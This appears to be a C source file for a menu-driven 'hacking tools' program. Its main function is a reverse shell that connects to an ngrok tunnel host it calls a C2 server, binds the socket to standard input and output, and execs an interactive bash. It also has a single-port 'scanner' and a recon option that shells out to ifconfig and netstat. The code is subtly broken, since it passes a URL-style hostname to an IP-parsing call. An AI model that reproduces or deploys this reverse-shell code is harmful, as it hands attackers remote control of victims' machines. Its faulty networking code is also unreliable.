#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>

#define NGROK_HOST "tcp://0.tcp.eu.ngrok.io"
#define NGROK_PORT 15249

void reverse_shell() {
    printf("[*] Establishing reverse shell connection...\n");
    printf("[*] Target: %s:%d\n", NGROK_HOST, NGROK_PORT);
    
    int sockfd;
    struct sockaddr_in server_addr;
    
    // Create socket
    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("[-] Socket creation failed");
        return;
    }
    
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(NGROK_PORT);
    
    if (inet_pton(AF_INET, NGROK_HOST, &server_addr.sin_addr) <= 0) {
        perror("[-] Invalid address");
        close(sockfd);
        return;
    }
    
    // Connect to ngrok
    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("[-] Connection failed");
        close(sockfd);
        return;
    }
    
    printf("[+] Connected to C2 server!\n");
    
    // Redirect file descriptors
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);
    
    // Execute shell
    char *args[] = {"/bin/bash", "-i", NULL};
    execve("/bin/bash", args, NULL);
    
    close(sockfd);
}

void port_scanner() {
    printf("[*] Starting port scanner through ngrok tunnel...\n");
    
    int sockfd;
    struct sockaddr_in server_addr;
    
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(NGROK_PORT);
    inet_pton(AF_INET, NGROK_HOST, &server_addr.sin_addr);
    
    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == 0) {
        printf("[+] Port %d is OPEN on %s\n", NGROK_PORT, NGROK_HOST);
        
        // Send scan results back through socket
        char buffer[1024];
        sprintf(buffer, "[SCAN] Port %d OPEN on %s\n", NGROK_PORT, NGROK_HOST);
        send(sockfd, buffer, strlen(buffer), 0);
        
        close(sockfd);
    } else {
        printf("[-] Port %d is CLOSED\n", NGROK_PORT);
    }
}

int main() {
    printf("=== Ngrok-Powered Hacking Tools ===\n");
    printf("Ngrok Tunnel: %s:%d\n", NGROK_HOST, NGROK_PORT);
    printf("Local Forward: localhost:4444\n");
    printf("Region: Europe (eu)\n");
    printf("Ping: 153ms\n");
    printf("===================================\n\n");
    
    printf("1. Reverse Shell\n");
    printf("2. Port Scanner\n");
    printf("3. Network Recon\n");
    printf("Choose option: ");
    
    int choice;
    scanf("%d", &choice);
    
    switch(choice) {
        case 1:
            reverse_shell();
            break;
        case 2:
            port_scanner();
            break;
        case 3:
            printf("[*] Network reconnaissance mode\n");
            system("ifconfig && netstat -tuln");
            break;
        default:
            printf("[-] Invalid option\n");
    }
    
    return 0;
}
